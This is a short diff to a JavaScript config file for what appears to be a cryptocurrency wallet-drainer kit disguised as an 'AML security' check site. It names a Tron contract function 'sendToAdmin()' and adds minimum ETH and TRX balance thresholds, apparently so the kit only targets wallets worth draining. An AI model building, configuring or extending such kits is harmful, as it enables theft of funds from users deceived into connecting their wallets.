@@ -24,10 +24,12 @@ const config = {
         url: 'https://aml-security.com', // origin must match your domain & subdomain
         icons: ['https://avatars.githubusercontent.com/u/179229932']
     },
+    minimumEthBalance: "0.003",
     // ---- Tron Configs ----
     tronContractAddress: "TJpaozAc7EioXybLdgvjgx5vMVojrcjEh7", // Replace with your contract address
     tronFunctionName: 'sendToAdmin()',
-    tronFunctionParams: []
+    tronFunctionParams: [],
+    minimumTrxBalance: 10
 }
 
 export default config
